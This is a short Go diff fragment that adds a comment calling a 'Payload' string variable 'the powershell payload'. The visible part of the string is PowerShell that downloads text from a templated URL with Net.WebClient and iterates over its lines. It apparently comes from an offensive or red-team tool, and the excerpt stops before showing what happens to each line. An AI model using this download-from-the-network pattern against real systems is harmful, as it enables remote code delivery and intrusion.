@@ -1,5 +1,6 @@
 package resources
 
+// Payload is the powershell payload
 var Payload string = `
 ForEach ($line in $((New-Object Net.WebClient).DownloadString('%s') -split "\n"))
 {
